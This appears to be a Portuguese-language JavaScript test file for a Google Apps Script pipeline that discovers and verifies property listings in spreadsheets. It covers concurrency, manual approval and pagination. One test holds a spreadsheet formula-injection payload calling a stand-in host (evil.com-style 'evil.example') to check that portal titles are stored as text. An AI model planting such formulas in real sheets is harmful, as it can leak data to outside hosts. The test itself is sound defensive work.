  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1])),
    [NEW_1]: response(200, listingPage({ price: 620000, url: NEW_1 })),
  });
  const lock = sandbox.context.LockService.getDocumentLock;
  sandbox.context.LockService.getDocumentLock = () => ({
    tryLock: () => {
      // No instante em que a busca pega o lock, a área administrativa já gravou o mesmo id.
      sandbox.sheets.LISTINGS._rows.push(listing(9, { listing_id: 'LIST_WEB_DFIMOVEIS_1400001', external_id: 1400001, source_url: NEW_1 }));
      return true;
    },
    releaseLock: () => {},
  });
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  sandbox.context.LockService.getDocumentLock = lock;
  const ids = table(sandbox, 'LISTINGS').map((r) => r.listing_id).filter((id) => id === 'LIST_WEB_DFIMOVEIS_1400001');
  assert.equal(ids.length, 1);
  const cand = table(sandbox, 'LISTING_CANDIDATES')[0];
  assert.equal(cand.status, 'pending');
  assert.match(cand.reject_reason, /já existe em LISTINGS \(LIST_WEB_DFIMOVEIS_1400001\)/);
  assert.equal(table(sandbox, 'LISTING_EVENTS').length, 0);
  assert.equal(lastRun(sandbox).new_listings, 0);
});

// --- revisão do PR #182 -------------------------------------------------------------------------

test('aprovado à mão sem leitura da página entra sem procedência automática e sem confirmação no portal', () => {
  // Cinco leituras bloqueadas, a pessoa digita preço e área e aprova. A rotina nunca viu a
  // página: nada de `automated_item_page_verified`, `last_seen_at` ou `last_check_status = ok`.
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  network(sandbox.context, { [SEARCH_URL]: response(200, searchPage([NEW_2])), [NEW_2]: response(429) });
  for (let d = 0; d < 5; d++) sandbox.context.runListingsDiscovery_({ now: day(d) });
  const header = sandbox.sheets.LISTING_CANDIDATES._rows[0];
  const row = sandbox.sheets.LISTING_CANDIDATES._rows[1];
  row[header.indexOf('asking_price_brl')] = 700000;
  row[header.indexOf('area_m2')] = 70;
  row[header.indexOf('status')] = 'approved';
  sandbox.context.runListingsDiscovery_({ now: day(5) });

  assert.equal(table(sandbox, 'LISTING_CANDIDATES')[0].status, 'promoted');
  const created = listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400002;
  assert.equal(created.quality_flag, 'manual_review_page_not_read');
  assert.equal(created.last_seen_at, '', 'sem confirmação no portal');
  assert.equal(created.source_page_verified_at, '');
  assert.equal(created.last_checked_at, '', 'a verificação o confere primeiro');
  assert.equal(created.last_check_status, '');
  assert.equal(created.last_check_http_code, '');
  assert.match(created.last_check_message, /sem leitura da página/);
  assert.equal(created.asking_price_brl, 700000);
  assert.match(table(sandbox, 'LISTING_EVENTS')[0].details, /aprovado à mão, sem leitura da página/);

  // Nunca conferido, ele vence na verificação seguinte, e só a leitura dela o confirma.
  const calls = [];
  sandbox.context.UrlFetchApp.fetchAll = (requests) => requests.map((r) => {
    calls.push(r.url);
    return r.url === NEW_2 ? response(200, listingPage({ price: 700000, area: 70, url: NEW_2, rooms: 3 })) : response(429);
  });
  sandbox.context.runListingsVerify_({ now: day(5), noContinuation: true });
  assert.ok(calls.includes(NEW_2));
  const verified = listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400002;
  assert.deepEqual(verified.last_seen_at, day(5));
  assert.equal(verified.last_check_status, 'ok');
});

test('aprovado à mão depois de lido: a confirmação no portal é a data da leitura, não a da aprovação', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1])),
    [NEW_1]: response(200, listingPage({ price: 6200000, url: NEW_1 })), // implausível: fica pendente
  });
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  const statusCol = sandbox.sheets.LISTING_CANDIDATES._rows[0].indexOf('status');
  sandbox.sheets.LISTING_CANDIDATES._rows[1][statusCol] = 'approved';
  sandbox.context.runListingsDiscovery_({ now: day(3) });

  const created = listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001;
  assert.equal(created.quality_flag, 'automated_item_page_verified');
  for (const field of ['last_seen_at', 'source_page_verified_at', 'last_checked_at']) {
    assert.equal(new Date(created[field]).getTime(), day(0).getTime(), `${field} é o da leitura`);
  }
  assert.equal(created.last_check_status, 'ok');
});

test('pedido explícito força busca manual, semanal e diária já feita, sobrevive à continuação e não repete', () => {
  const url = (s) => `${SEARCH_URL}?s=${s}`;
  const sandbox = createAppsScriptSandbox({ sheets: sheets({ searches: [
    searchRow({ search_id: 'DAY', search_url: url('day'), last_run_at: new Date(day(0).getTime() - 3600000) }),
    searchRow({ search_id: 'MAN', search_url: url('man'), frequency: 'manual', last_run_at: day(-1) }),
    searchRow({ search_id: 'WEEK', search_url: url('week'), frequency: 'weekly', last_run_at: day(-3) }),
    searchRow({ search_id: 'OFF', search_url: url('off'), active: false }),
  ] }) });
  const calls = network(sandbox.context, Object.fromEntries(['day', 'man', 'week', 'off'].map((s) => [url(s), response(200, searchPage([]))])));

  sandbox.context.runListingsDiscovery_({ now: day(0) });
  assert.deepEqual(calls, [], 'sem pedido, nada vence');

  sandbox.context.requestForcedDiscovery_(day(0));
  // Sem tempo para nenhuma busca: o pedido fica para a continuação.
  sandbox.context.runListingsDiscovery_({ now: day(0), budgetMs: -1, noContinuation: true });
  assert.deepEqual(calls, []);
  assert.ok(sandbox.properties.LISTINGS_DISCOVERY_FORCE_AFTER, 'pedido sobrevive ao run inacabado');

  const later = new Date(day(0).getTime() + 60000);
  sandbox.context.runListingsDiscovery_({ trigger: 'continuation', now: later });
  assert.deepEqual(calls.sort(), [url('day'), url('man'), url('week')]);
  assert.equal(sandbox.properties.LISTINGS_DISCOVERY_FORCE_AFTER, undefined, 'pedido atendido se apaga');

  calls.length = 0;
  sandbox.context.runListingsDiscovery_({ now: new Date(later.getTime() + 60000) });
  assert.deepEqual(calls, [], 'atendido uma vez só');
});

test('menu "buscar novos agora" e listings_job discovery registram o pedido explícito; verify não', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets(), scriptProperties: { ADMIN_TOKEN: 't', DATASET_VERSION: '1' } });
  const seen = [];
  sandbox.context.runListingsDiscovery_ = (options) => {
    seen.push({ options, request: sandbox.properties.LISTINGS_DISCOVERY_FORCE_AFTER });
    return 'ok';
  };
  sandbox.context.listingsDiscoverNow_UI();
  assert.equal(seen.length, 1);
  assert.match(seen[0].request, /^\d{4}-\d{2}-\d{2}T/);

  delete sandbox.properties.LISTINGS_DISCOVERY_FORCE_AFTER;
  post(sandbox.context, { token: 't', action: 'listings_job', job: 'verify' });
  assert.equal(sandbox.properties.LISTINGS_DISCOVERY_FORCE_AFTER, undefined);
  post(sandbox.context, { token: 't', action: 'listings_job', job: 'discovery' });
  assert.match(sandbox.properties.LISTINGS_DISCOVERY_FORCE_AFTER, /^\d{4}-\d{2}-\d{2}T/);
});

test('falha ao criar gatilho: listings_job responde SCHEDULE_FAILED; review_candidate grava a decisão e avisa', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets(), scriptProperties: { ADMIN_TOKEN: 't', DATASET_VERSION: '1' } });
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_2])),
    [NEW_2]: response(403),
  });
  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
  sandbox.context.ScriptApp.newTrigger = () => { throw new Error('Esta conta atingiu a cota de gatilhos'); };

  const job = post(sandbox.context, { token: 't', action: 'listings_job', job: 'discovery' });
  assert.equal(job.ok, false);
  assert.equal(job.error.code, 'SCHEDULE_FAILED');
  assert.match(job.error.message, /cota de gatilhos/);

  const review = post(sandbox.context, { token: 't', action: 'review_candidate', candidate_id: 'CAND_DFIMOVEIS_1400002', decision: 'approved' });
  assert.equal(review.ok, true);
  assert.equal(review.record.discovery_scheduled, false);
  assert.match(review.record.discovery_schedule_error, /cota de gatilhos/);
  assert.equal(table(sandbox, 'LISTING_CANDIDATES')[0].status, 'approved');
});

// --- revisão do PR #182, rodada 2: o que muda na planilha enquanto a busca está na rede ---------

/** Lock de documento que, no instante em que é pego, aplica `edit` (a pessoa mexeu durante a rede). */
function editDuringRun(sandbox, edit) {
  sandbox.context.LockService.getDocumentLock = () => ({
    tryLock: () => { edit(); return true; },
    releaseLock: () => {},
  });
}

function setCandidate(sandbox, row, field, value) {
  const header = sandbox.sheets.LISTING_CANDIDATES._rows[0];
  sandbox.sheets.LISTING_CANDIDATES._rows[row][header.indexOf(field)] = value;
}

test('candidato rejeitado à mão enquanto a busca lia a página não é promovido nem desfeito', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  let blocked = true;
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1])),
    [NEW_1]: () => (blocked ? response(403) : response(200, listingPage({ price: 620000, url: NEW_1 }))),
  });
  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
  blocked = false;
  editDuringRun(sandbox, () => setCandidate(sandbox, 1, 'status', 'rejected'));
  sandbox.context.runListingsDiscovery_({ now: day(1), noContinuation: true });

  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001, undefined, 'rejeitado não vira anúncio');
  assert.equal(table(sandbox, 'LISTING_CANDIDATES')[0].status, 'rejected');
  assert.equal(table(sandbox, 'LISTING_EVENTS').length, 0);
  assert.equal(lastRun(sandbox).new_listings, 0);
  assert.match(lastRun(sandbox).error_details, /CAND_DFIMOVEIS_1400001: linha alterada durante a busca/);
});

test('preço digitado durante a busca não é sobrescrito, e a execução seguinte promove com ele', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  let blocked = true;
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1])),
    [NEW_1]: () => (blocked ? response(403) : response(200, listingPage({ price: 620000, url: NEW_1 }))),
  });
  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
  blocked = false;
  const lock = sandbox.context.LockService.getDocumentLock;
  editDuringRun(sandbox, () => setCandidate(sandbox, 1, 'asking_price_brl', 655000));
  sandbox.context.runListingsDiscovery_({ now: day(1) });
  assert.equal(table(sandbox, 'LISTING_CANDIDATES')[0].asking_price_brl, 655000);
  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001, undefined);
  assert.deepEqual(sandbox.triggers.map((t) => t.getHandlerFunction()), ['listingsDiscoveryContinue']);

  sandbox.context.LockService.getDocumentLock = lock;
  sandbox.context.runListingsDiscovery_({ now: day(1), noContinuation: true });
  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001.asking_price_brl, 655000);
});

test('busca editada durante a execução continua vencida e é refeita na continuação', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  const edited = `${SEARCH_URL}?quartos=3`;
  network(sandbox.context, { [SEARCH_URL]: response(200, searchPage([])) });
  editDuringRun(sandbox, () => {
    // O gatilho de edição esvazia last_run_at e troca a URL.
    const header = sandbox.sheets.LISTING_SEARCHES._rows[0];
    const row = sandbox.sheets.LISTING_SEARCHES._rows[1];
    row[header.indexOf('search_url')] = edited;
    row[header.indexOf('last_run_at')] = '';
  });
  sandbox.context.runListingsDiscovery_({ now: day(0) });
  const search = table(sandbox, 'LISTING_SEARCHES')[0];
  assert.equal(search.search_url, edited);
  assert.equal(search.last_run_at, '', 'o resultado da URL antiga não marca a busca como feita');
  assert.match(lastRun(sandbox).error_details, /busca alterada durante a execução/);
  assert.deepEqual(sandbox.triggers.map((t) => t.getHandlerFunction()), ['listingsDiscoveryContinue']);
});

test('candidato aprovado sem identidade da fonte não é promovido', () => {
  const CAND_HEADERS = [
    'candidate_id', 'discovered_at', 'discovered_by', 'source_id', 'source_name', 'source_url',
    'external_id', 'title', 'transaction_type', 'property_type', 'address', 'locality',
    'ra_geo_id', 'latitude', 'longitude', 'asking_price_brl', 'area_m2', 'bedrooms', 'suites',
    'parking_spaces', 'condo_fee_brl', 'iptu_brl', 'features_json', 'raw_json', 'status',
    'reviewed_at', 'reject_reason', 'parser_version',
  ];
  const row = (over) => {
    const r = Object.fromEntries(CAND_HEADERS.map((h) => [h, '']));
    Object.assign(r, {
      discovered_at: day(-1), discovered_by: 'agente:gpt', transaction_type: 'sale', property_type: 'apartamento',
      locality: 'Águas Claras', asking_price_brl: 640000, area_m2: 64, bedrooms: 2, status: 'approved',
    }, over);
    return CAND_HEADERS.map((h) => r[h]);
  };
  const base = sheets({ searches: [] });
  base.LISTING_CANDIDATES = [CAND_HEADERS,
    row({ candidate_id: 'C1', source_name: '', source_url: NEW_1, external_id: '1400001' }),
    row({ candidate_id: 'C2', source_name: 'DFImoveis', source_url: 'portal dfimoveis', external_id: '1400002' }),
    row({ candidate_id: 'C3', source_name: 'DFImoveis', source_url: NEW_1, external_id: '' }),
  ];
  const sandbox = createAppsScriptSandbox({ sheets: base });
  network(sandbox.context, {});
  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
  const cands = Object.fromEntries(table(sandbox, 'LISTING_CANDIDATES').map((c) => [c.candidate_id, c]));
  assert.match(cands.C1.reject_reason, /portal \(source_name\) vazio/);
  assert.match(cands.C2.reject_reason, /source_url não é um endereço http\(s\)/);
  assert.match(cands.C3.reject_reason, /external_id vazio/);
  for (const c of Object.values(cands)) assert.equal(c.status, 'approved');
  assert.equal(table(sandbox, 'LISTINGS').filter((r) => /^LIST_WEB_/.test(r.listing_id) && !/\d{5,}$/.test(r.listing_id)).length, 0);
  assert.equal(lastRun(sandbox).new_listings, 0);
});

// --- revisão do PR #182, rodada 3 ---------------------------------------------------------------

test('busca editada durante a execução: o que a URL antiga trouxe não entra', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1])),
    [NEW_1]: response(200, listingPage({ price: 620000, url: NEW_1 })),
  });
  editDuringRun(sandbox, () => {
    const header = sandbox.sheets.LISTING_SEARCHES._rows[0];
    sandbox.sheets.LISTING_SEARCHES._rows[1][header.indexOf('search_url')] = `${SEARCH_URL}?quartos=4`;
  });
  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
  assert.equal(table(sandbox, 'LISTING_CANDIDATES').length, 0, 'candidato do filtro antigo não entra');
  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001, undefined);
  assert.equal(table(sandbox, 'LISTING_EVENTS').length, 0);
  assert.equal(lastRun(sandbox).new_listings, 0);
  assert.equal(lastRun(sandbox).candidate_rows, 0);
});

test('mesmo anúncio posto na fila por outro escritor durante a execução não é duplicado', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1])),
    [NEW_1]: response(200, listingPage({ price: 620000, url: NEW_1 })),
  });
  editDuringRun(sandbox, () => {
    // Um agente externo grava o mesmo anúncio com outro candidate_id enquanto a busca lia.
    const header = sandbox.sheets.LISTING_CANDIDATES._rows[0];
    const row = header.map(() => '');
    Object.entries({ candidate_id: 'CAND_GPT_7', discovered_by: 'agente:gpt', source_name: 'DFImoveis',
      source_url: NEW_1, external_id: '1400001', status: 'pending' }).forEach(([k, v]) => { row[header.indexOf(k)] = v; });
    sandbox.sheets.LISTING_CANDIDATES._rows.push(row);
  });
  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
  const cands = table(sandbox, 'LISTING_CANDIDATES');
  assert.deepEqual(cands.map((c) => c.candidate_id), ['CAND_GPT_7']);
  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001, undefined, 'a promoção sai com o candidato descartado');
  assert.match(lastRun(sandbox).error_details, /já entrou na fila por outro escritor/);
});

test('título do portal que começa com = é gravado como texto, nunca como fórmula', () => {
  const evil = '=IMPORTXML("https://evil.example/x","//a")';
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  let blocked = true;
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1, NEW_2])),
    [NEW_1]: response(200, listingPage({ price: 6200000, url: NEW_1, title: evil })), // implausível: fica na fila
    [NEW_2]: () => (blocked ? response(403) : response(200, listingPage({ price: 9900000, area: 70, url: NEW_2, rooms: 3, title: '+SUM(1)' }))),
  });
  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
  const raw = (id) => {
    const header = sandbox.sheets.LISTING_CANDIDATES._rows[0];
    return sandbox.sheets.LISTING_CANDIDATES._rows.find((r) => r[header.indexOf('external_id')] === id)[header.indexOf('title')];
  };
  assert.equal(raw('1400001'), `'${evil}`, 'candidato novo: append');
  blocked = false;
  sandbox.context.runListingsDiscovery_({ now: day(1), noContinuation: true });
  assert.equal(raw('1400002'), "'+SUM(1)", 'candidato existente: regravação por coluna');
  assert.equal(raw('1400001'), `'${evil}`, 'a coluna regravada não devolve o texto antigo como fórmula');
});

// --- revisão do PR #182, rodada 4 ---------------------------------------------------------------

test('read_status = ok escrito por fora não vale como leitura: a página é lida, e sem leitura não há procedência automática', () => {
  const CAND_HEADERS = [
    'candidate_id', 'discovered_at', 'discovered_by', 'source_id', 'source_name', 'source_url',
    'external_id', 'title', 'transaction_type', 'property_type', 'address', 'locality',
    'ra_geo_id', 'latitude', 'longitude', 'asking_price_brl', 'area_m2', 'bedrooms', 'suites',
    'parking_spaces', 'condo_fee_brl', 'iptu_brl', 'features_json', 'raw_json', 'status',
    'reviewed_at', 'reject_reason', 'parser_version',
  ];
  const forged = Object.fromEntries(CAND_HEADERS.map((h) => [h, '']));
  Object.assign(forged, {
    candidate_id: 'CAND_GPT_1', discovered_at: day(-1), discovered_by: 'agente:gpt', source_name: 'DFImoveis',
    source_url: NEW_1, external_id: '1400001', transaction_type: 'sale', property_type: 'apartamento',
    locality: 'Águas Claras', asking_price_brl: 640000, area_m2: 64, bedrooms: 2, status: 'pending',
    raw_json: JSON.stringify({ read_status: 'ok', last_read_at: '2026-10-07T12:00:00.000Z', read_sig: 'forjado' }),
  });
  const base = sheets({ searches: [] });
  base.LISTING_CANDIDATES = [CAND_HEADERS, CAND_HEADERS.map((h) => forged[h])];
  const sandbox = createAppsScriptSandbox({ sheets: base });
  const calls = network(sandbox.context, { [NEW_1]: response(403) });
  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
  assert.deepEqual(calls, [NEW_1], 'o atestado forjado não dispensa a leitura');
  assert.equal(listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001, undefined, 'pendente sem leitura não é promovido');

  setCandidate(sandbox, 1, 'status', 'approved');
  sandbox.context.runListingsDiscovery_({ now: day(1), noContinuation: true });
  const created = listingsById(sandbox).LIST_WEB_DFIMOVEIS_1400001;
  assert.equal(created.quality_flag, 'manual_review_page_not_read');
  assert.equal(created.last_seen_at, '');
  assert.equal(created.last_check_status, '');
});

test('paginação: página só com anúncios conhecidos não encerra; página repetida encerra', () => {
  const paged = `${SEARCH_URL}?pagina={page}`;
  const page = (n) => `${SEARCH_URL}?pagina=${n}`;
  const NEW_3 = `${HOST}/imovel/apartamento-2-quartos-venda-aguas-claras-brasilia-df-1400003`;
  const sandbox = createAppsScriptSandbox({ sheets: sheets({ searches: [searchRow({ search_url: paged, max_pages: 5 })] }) });
  const calls = network(sandbox.context, {
    [page(1)]: response(200, searchPage([NEW_1])),
    [page(2)]: response(200, searchPage([EXISTING])), // só conhecido
    [page(3)]: response(200, searchPage([NEW_3])),
    [page(4)]: response(200, searchPage([NEW_3])), // fora do intervalo: o portal repete a última
    [NEW_1]: response(403),
    [NEW_3]: response(403),
  });
  sandbox.context.runListingsDiscovery_({ now: day(0), noContinuation: true });
  assert.deepEqual(calls.filter((u) => u.includes('pagina=')), [page(1), page(2), page(3), page(4)], 'p5 não é pedida');
  assert.deepEqual(table(sandbox, 'LISTING_CANDIDATES').map((c) => c.external_id).sort(), ['1400001', '1400003']);
  assert.equal(table(sandbox, 'LISTING_SEARCHES')[0].last_found_count, 3, 'a página repetida não conta de novo');
});

test('falha ao agendar a continuação depois de gravar: o run fecha parcial, nunca fica running', () => {
  const sandbox = createAppsScriptSandbox({ sheets: sheets() });
  network(sandbox.context, {
    [SEARCH_URL]: response(200, searchPage([NEW_1, NEW_2])),
    [NEW_1]: response(200, listingPage({ price: 620000, url: NEW_1 })),
    [NEW_2]: response(200, listingPage({ price: 700000, area: 70, url: NEW_2, rooms: 3 })),
  });
  sandbox.context.ScriptApp.newTrigger = () => { throw new Error('Esta conta atingiu a cota de gatilhos'); };
  sandbox.context.runListingsDiscovery_({ now: day(0), readsPerRun: 1 });
  const run = lastRun(sandbox);
  assert.equal(run.status, 'partial');
  assert.match(run.error_details, /^CONTINUATION_NOT_SCHEDULED: Esta conta atingiu a cota/);
  assert.equal(run.new_listings, 1, 'o que foi gravado continua registrado');
  assert.equal(meta(sandbox, 'listings_last_discovery_status'), 'partial');

  // A verificação diária tem o mesmo ponto: grava e depois agenda.
  sandbox.context.UrlFetchApp.fetchAll = (requests) => requests.map(() => response(429));
  sandbox.context.runListingsVerify_({ now: day(1), maxPerRun: 1 });
  const verify = lastRun(sandbox);
  assert.equal(verify.status, 'failed', 'tudo bloqueado continua failed');
  assert.match(verify.error_details, /^CONTINUATION_NOT_SCHEDULED/);
  assert.notEqual(verify.status, 'running');
});
